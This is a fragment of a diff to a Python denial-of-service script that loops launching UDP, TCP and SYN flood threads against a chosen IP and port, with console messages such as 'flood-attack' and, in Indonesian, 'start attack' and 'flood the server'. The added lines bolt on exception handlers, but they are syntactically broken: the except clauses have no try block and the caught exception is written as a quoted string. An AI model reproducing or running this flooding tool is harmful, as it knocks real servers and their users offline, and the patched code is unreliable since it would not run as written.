@@ -107,9 +107,23 @@ while True:
         u = udp(ip,port,size,packets)
         u.start()
         print("\033[33m[\033[1m+\033[33m]\033[92m0ps Request Sent   " +str(u)+ "  \033[33mflood-attack " +str()+ "   \033[97m" +ip+ "\033[0m" )
+    except KeyboardInterrupt:
+        print ("Stopping Flood!")
+        sys.exit()
+    except ('socket.error, msg'):
+        print ("Socket Couldn't Connect")
+        sys.exit()
+     
         t = tcp(ip,port,size,packets) 
         t.start()
         print("\033[33m[\033[1m+\033[33m]\033[92m0ps Silent    " +str(u)+ "  \033[33mflood-attack " +str()+ "   \033[97m" +ip+ "\033[0m" )
+    except KeyboardInterrupt:
+        print ("Stopping Flood!")
+        sys.exit()
+    except ('socket.error, msg'):
+        print ("Socket Couldn't Connect")
+        sys.exit()
+     
         s = syn(ip,port,packets)
         s.start()
         print("\033[33m[\033[1m+\033[33m]\033[92mMemulai serangan   " +str(u)+ "  \033[33mMembanjiri-server " +str()+ "   \033[97m" +ip+ "\033[0m" )
